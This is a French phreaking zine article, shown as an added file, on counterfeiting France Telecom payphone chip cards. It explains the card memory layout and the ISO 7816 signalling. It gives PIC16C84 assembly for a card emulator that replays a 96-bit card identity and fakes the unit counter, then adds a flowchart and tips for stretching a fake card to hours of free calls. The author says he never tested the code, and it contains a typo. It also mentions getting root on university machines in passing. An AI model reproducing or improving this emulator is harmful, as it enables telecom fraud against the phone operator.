@@ -1,0 +1,439 @@
+   
+   :----------------------------------------------------------------------:   
+   | ---:--- :----  :    :----  /---    /\    /---\  ---:--- :----  /---  | 
+   |    |    |____  |    |____ |       /  \   |___|     |    |____  \     |
+   |    |    |      |    |     |      /____\  |   \     |    |        \   |
+   |    |    |____  |___ |____  \___ /      \ |    \    |    |____  ___/  |
+   |______________________________________________________________________|
+		    
+		    ET CARTES A PUCES ASYNCHRONES
+			 par bLoRP
+			     ^^^^^
+
+1/CARTES A MEMOIRES DE TYPES TELECARTE:
+  
+  une carte a m‚moire est essentiellement compos‚e d'une m‚moire electronique 
+connectable et inscriptible, associ‚e a un compteur.La memoire d'une 
+telecarte, de type EPROM a une capacit‚e de 256 ‚lements binaires dont les 
+96 premiers sont utilis‚s par l'exploitant du reseau pour l'identification de 
+l'appelant et ses droits et dont les 160 ‚lŠments suivant servent a 
+l'enregistrement des unit‚s consomm‚s.
+	   ------------> 200 millions de telecartes distribu‚es en 1990
+‚lŠment binaire: 1 bit
+
+1.1/PROTECTION DES CARTES A PUCES (generales):
+       
+  Les cartes a puces integrent toutes des fonctions cryptographiques qui 
+rendent leur contenu sinon inviolable au moins incomprehensible pour toute 
+personne malveillante(eh eh :)).Une protection par fusible est aussi possible, 
+apr‚s la programmation de la carte en usine, un fusible interne est grill‚ et 
+rend la carte illisible de l'exterieur.Les t‚lŠcartes ne semblent pas 
+incorporer une protection cryptographique avec une cl‚s secrete par contre 
+elles sont prot‚g‚es par un fusible(fuck FT !!) ce qui les rends totalement 
+illisibles avec un materiel d'amateur.Les pirates n'ont donc que deux options, 
+soit arriver a lire le programme contenu dans dans la puces et a recharger ce 
+programme sur une carte a microcontrolleur (qu'ils auront eux memes fabriqu‚) 
+soit reinventer un programme  qui leur permette d'emuler la telecarte, 
+toujours au moyen d'une carte a microcontroleur.Cette deuxieme solution reste 
+tr‚s compliqu‚e a mettre en oeuvre puisque la carte pirate doit repondre 
+exactement comme la vraie lors de l'initialisation de la cabine et de 
+l'‚criture dans la memoire de la carte.Les plans de fausses telecartes avaient 
+et‚ publi‚ dans le phrack 48, malheureusement l'emulation n'etant pas assez 
+rapide, ces fausses cartes cessŠrent de fonctionner avec l'apparition des 
+nouvelles cabines telephoniques (beuh :( !! )).
+  
+1.2/REALISATION DES FAUSSES CARTES A PUCES:
+
+   Avant de realiser une fausse telecarte il faut donc deja connaitre un 
+minimum leur principe de fonctionnement et leur caracteristiques techniques.
+Par exemple il faut savoir que les cartes a puces asychrones de types ISO 
+(7816 par exemple) communiquent avec la cabine avec une liaison serie 
+utilisant un protocole a parit‚e paire.les cartes a puces ISO respectent aussi 
+la norme ISO invers‚e ce qui veut dire que ce sont d'abort les bits de poids 
+fort qui sont d'abord transmis et qu'un niveau bas (0v) represente en fait un 1 logique.
+L'emulateur de telecarte decrit dans le phrack 48respectait parfaitement ces 
+conditions et le pic 16c84 qui servait a l'emulation etait tr‚s bien adapt‚.Le 
+probleme se posa lorsque les nouvelles telecabines arrivŠrent, celles ci 
+demandaient en effet une emulation plus rapide.Le programme contenu dans le 
+pic 16c84 qui tournait a 4mhz fut alors mis dans un 16c84 a 10mhz, avec ce 
+nouveau microcontrolleur la phase d'initialisation etait … nouveau emul‚e 
+correctement, en effet, la cabine ne detectait pas la fausse telecarte apr‚s 
+avoir envoyer son reset.Les problemes commencaient en fait apr‚s 
+l'initialisation lorsque la cabine et le pic ecrivait dans la memoire, la 
+cabine detectait la fausse carte et  refusait systematiquement tout appel.En 
+fait pour ‚crire dans la memoire du pic 16c84 il faut au minimum 10ms(au 
+lieu de 500ns pour la vraie :( ), cette inconvenient est due au fait que la 
+memoire utilis‚e lors de l'emulation est une EEPROM (memoire programable et 
+effacable electriquement sans uv).En effet un microcontroleur a eeprom est 
+ideal pour le developpement du programme (masque) puisque il n'y a pas besoin 
+de passer longuement le microcontroleur sous les uv pour effacer sa memoire !!
+.C'est cet interval de 10ms qui perturbe la telecabine et qui fait echouer 
+l'emulation, pour reussir il faudrat evoluer vers des microcontroleurs ayant 
+des memoires plus rapides (pic16c74-71) ou ajouter une eeprom externe au pic 
+16c84, plus rapide, cependant le temps necessaire au calcul de l'adressage 
+devrait aussi etre assez important et le montage ne serait finalement pas 
+vraiment plus performant!!
+  
+2/LES NOUVEAUX PROGRAMMES:
+
+  le programme suivant est en fait une version optimis‚e pour le pic 16c84 
+10mhz du programme paru dans le phrack47 initialement prevu pour tourner sur 
+un pic a 4mhz!:
+  ce n'est pas moi qui ait retravaill‚ le code, et il semble que ce programme 
+marche a peut pr‚s, sauf sur certaines cabines.De toute facon l'emulation 
+reste partielle et les d‚conections sont frequentes :(
+ 
+
+		 LIST p=16C84,r=dec
+	pc equ 02h ; Program counter
+	sr equ 03h ; Status register
+	fsr equ 04h ; file select
+	porta equ 05h ; Port a
+	portb equ 06h ; Port b
+	eedata equ 08h ; Eeprom data register
+	eeadr equ 09h ; Eeprom adress register
+	eecon1 equ 08h
+	eecon2 equ 09h
+	add equ 0Ch ; Ptr memoire lecture carte
+	
+	#DEFINE OUT portb,0 ; 
+	#DEFINE ST portb,2 ;
+	#DEFINE RAZ portb,1 ; pattes de la carte
+	#DEFINE PRO portb,3 ;
+	#DEFINE VPP portb,4 ;
+	#DEFINE RD eecon1,0 
+	#DEFINE WR eecon1,1 
+	#DEFINE WREN eecon1,2 
+	#DEFINE EEIF eecon1,4 
+	#DEFINE RP0 sr,5 
+	
+	org 00
+	start movlw 126
+	tris portb 
+	clrf eeadr
+	bsf RP0
+	bsf RD 
+	bcf RP0
+	movlw 155
+	subwf eedata,0 
+	btfsc sr,0 
+	bcf eedata,7 
+	star2 bsf OUT
+	clrf add 
+	debut btfss VPP 
+	goto star2
+	stl btfss ST 
+	goto stl
+	bsf OUT
+	btfsc PRO 
+	goto prog
+	sth btfsc ST 
+	goto sth
+	btfss RAZ ; test RAZ
+	goto star2
+	incf add,1
+	movf add,0
+	btfsc add,7
+	goto mempro
+	call carte
+	movwf portb
+	goto debut
+	mempro subwf eedata,0 ; SR0=0 si add > eedata !!
+	btfss sr,0 
+	bcf OUT ; zone unit‚s libres
+	goto debut
+	prog movf add,0
+	movwf eedata
+	bsf OUT
+	bsf RP0
+	bsf WREN 
+	bcf EEIF
+	movlw 055h
+	movwf eecon2
+	movlw 0aah
+	movwf eecon2
+	bsf WR 
+	pro_ok btfss EEIF 
+	goto pro_ok 
+	bcf RP0
+	goto debut
+	carte addwf pc,1
+	; mot 'C7' (nø de carte complet - 96 bits)
+	retlw 1 
+	retlw 1
+	retlw 0
+	retlw 0
+	;
+	retlw 0 
+	retlw 1
+	retlw 1
+	retlw 1
+	; mot '06' 
+	retlw 0
+	retlw 0
+	retlw 0
+	retlw 0
+	;
+	retlw 0
+	retlw 1
+	retlw 1
+	retlw 0
+	; mot '85'
+	 retlw 1
+	retlw 0
+	retlw 0
+	etlw 0
+	;
+	retlw 0
+	retlw 1
+	retlw 0
+	retlw 1
+	; mot '03' 
+	retlw 0
+	retlw 0
+	 retlw 0
+	 retlw 0
+	;
+	retlw 0
+	 retlw 0
+	 retlw 1
+	retlw 1
+	; mot 'C7'
+	retlw 1
+	retlw 1
+	retlw 0
+	retlw 0
+	;
+	retlw 0
+	retlw 1
+	retlw 1 
+	retlw 1
+	;
+	; mot '04'
+	retlw 0
+	retlw 0
+	retlw 0
+	retlw 0
+	;
+	retlw 0
+	retlw 1
+	retlw 0
+	retlw 0
+	;
+	; mot '46'
+	retlw 0
+	retlw 1
+	retlw 0
+	retlw 0
+	;
+	retlw 0
+	retlw 1
+	retlw 1
+	retlw 0
+	 ;
+	 ; mot '0E'
+	retlw 0
+	retlw 0
+	retlw 0
+	 retlw 0
+	;
+	retlw 1
+	retlw 1
+	retlw 1
+	retlw 0
+	;
+	 ; mot 'CB'
+	retlw 1
+	retlw 1
+	retlw 0
+	retlw 0
+	;
+	retlw 1
+	retlw 0
+	retlw 1
+	retlw 1
+	;
+	; mot '8A'
+	retlw 1
+	retlw 0
+	retlw 0
+	retlw 0
+	; 
+	retlw 1
+	retlw 0
+	retlw 1
+	retlw 0
+	;
+	; mot '10'
+	retlw 0
+	retlw 0
+	retlw 0
+	retlw 1
+	;       
+	retlw 0
+	retlw 0
+	 retlw 0
+	retlw 0
+	;
+	; mot '06'
+	retlw 0
+	retlw 0
+	retlw 0
+	retlw 0
+	;
+	retlw 0
+	retlw 1
+	retlw 1
+	 retlw 0
+	;34 fois retlw 1
+ end
+    
+   compilation OK avec : MPASM
+
+  Je n'ait pas essay‚ personellement ce programme, mais je sais que 
+certaines personnes l'ont fait marcher, alors, ne tapez pas sur l'auteur !!!
+Pour la fausse telecarte, les plans du phrack restent valablent, il faut 
+juste changer la puce!
+
+
+
+3.1/UN PTIT ORGANIGRAMME SYMPA:  
+
+ cet organigramme n'est vraiment qu'un squellette minuscule du programme qui 
+ devra etre cod‚ pour l'emulation:
+    
+	_______________                      ___________
+       | intteruption  |                    |   DEBUT   |
+       |   en cas de   |                    |___________|
+       |     RESET     |                          |
+       |_______________|                          |
+	      |                                   |
+	      |                          _________v_________
+	______v______                   | saut a la routine |
+       |  routine de |                  |       de          |
+       |  reponse au |<-----------------|  traitement du    |
+       |    RESET    |                  |       RESET       |
+       |_____________|                  |___________________|
+	      |
+	      |                                    ___________________
+	______v______   non              _________v_________          |
+       | mem = 1  ?? |___________       | recuperation de   |         |
+       |_____________|           |      |    l'adresse      |         |
+	      | oui              +----->|  memoire point‚e  |         |
+	      |                         |  par la telecarte |         |
+	      |                         |___________________|         |
+	      v                                  |                    |
+	      |                                  |                    |
+	      |                           _______v______              |
+	      |                          |  mise d'une  |             |
+	      |                          |  memoire a 1 |             |
+	      |                          |   mem = 1    |             |
+	      |                          |______________|             |
+	      |                                  |                    |
+	      |                                  |                    |
+	      |                       ___________v___________         |
+	      |                      |    simulation de la   |        |
+	      |                      |       reponse en      |        |
+	      |                      |  utilisant un algo ou |        |
+	      v                      | des datas de l'EEPROM |        |
+	      |                      |_______________________|        |
+	      |                                  |                    |
+	      |                                  |                    |
+	      |                         _________v__________          |
+	      |                        | 97 bits simul‚ ?? |          |
+	      |                        |     (atteind ??)   | nan     |
+	      v                        |____________________|---------+
+	      |                                  | oui
+	      |__________________________________v
+			      |                       
+			______v________               
+		       | broche i/o a 1|<-------------:             
+		       |_______________|              |
+			      |                       |
+			      |                       |
+		      ________v_________              |
+		     |   recuperation   |             |
+		     |  adresse point‚e |             |
+		     |__________________|             |
+			      |                       |
+			      |<--------------:       |
+		      --------v---------      |       |
+		     | si le bit a ete  | nan |       |
+		     |     ecrit        |-----:       |
+		     |__________________|             |
+			      | oui                   |
+			      |                       |
+		      --------v--------               |
+		     |  la broche i/o  |              |
+		     |    est mise     |              |
+		     |     a 0         |              |
+		     |_________________|              |
+			      |                       |
+			      |                       |
+		     _________v_________              |
+		    |   y'a t'il eu une |             |
+		    | impulsion sur la  | oui         |
+		    | broche clock ???  |_____________|
+		    |___________________|
+			     |  nan
+			     |
+		  ___________v__________
+		 |   bravo, vous venez  |
+		 |  d'enculer FT ;))))) |
+		 |______________________|
+			    |
+			    |
+		      ______v______
+		     | THE END ;)) |
+		     |_____________|
+
+   
+  petite explication: si vous voulez comprendre cet organigramme, lisez donc    
+le texte "what you need to know about electronic telecards" de SB, tout la
+sequence de lecture ecriture de la carte est expliqu‚e en detail.Plusieurs
+probl‚mes se posent en fait, les donn‚e contenue dans les 97 premiers bits
+pourront elles etres lues sufisement rapidement pour que la cabine ne detecte
+pas l'emeulation ???
+ -quelle etat presente la broche i/o pendant l'incrementation du compteur???
+ -combien de temps laisser la broche i/o active ???
+Si vous connaissez la reponse a une de ces questions, c'est du 0.00 fr/min ;))
+une autre astuce:
+   
+   une solution inexplor‚e serait aussi de presenter sur la broche i/o un 
+etat haut (5v) pour indiquer a la cabine que l'ecriture du bit n'a pas et‚ 
+effectu‚e correctement, il est probable qu'au bout de 3 essais d'ecriture, la
+cabine rejette la carte, ceci dit vous avez deja tripl‚ la dur‚e de vie de 
+votre fausse carte et vous n'avez poa besoin de couper la communication pour
+beneficier a nouveau de 120 unit‚es :o). En fait avec cette methode, vous 
+devriez pouvoir rester en ligne pendant 2 heures d'affil‚es (arf :))).
+
+   Le seul probleme est en fait que la simulation des 97 premiers bits ne sera
+assez rapide, il faudraitsimuler ces bit soit en trouvant un algoritme qui
+corresponde a ces bits, soit charcher dans la ram du pic des données presentes
+dans l'eeprom, ce qui resoudrait le probleme des 10ms necessaires au pic.
+
+   Finalement la solution reste peut etre l'emulation a partir d'un ordinateur 
+portable, certains programme sont tr‚s au point, d'autant plus que si l'on 
+veut se connecter au net ou devenir root sur une des suns de sa facs, y faudra 
+forcement un portable :) .
+  La derniere solution reste les fausses telecartes a base d'eprom serie et de
+portes logiques pour l'adressage, certains plans circulent ;) et il semble que
+les premiers resultats soit TRES concluants .....;-)
+ 
+ voila, that's all  !!!!
+	A++  bLoRp
+	    ^^^^^^^
+greets: 
+   -NeurO et sa page oueb qui reste LA source de documentation ;)
+   -kickers, jump4, crifalo et kra qui font vivre la scene lyonnaise ;)
+et puis Aaah qui m'tien compagnie sur le dalnet ;))    
+j'oubliait cod4 qui publie cet article (putain il est fous ;))))
+ps: desolez pour mon orthografe, mais j'en avait marre de perdre mon temps en
+cours de francais :(
+----------------------------------------------------------------------------
+ou me voir: irc:#banane (on ircnet)
+		#phreakfr ---->le best chanel de phreaking (non non j'fais 
+	     poa de pub!!) <--sur dalnet humm pis sur #phe dalnet aussi :)
+http://www.mygale.org/09/blorp/benhack.htm
+ou forum eprat:  www.eprat.com
+----------------------------------------------------------------------------
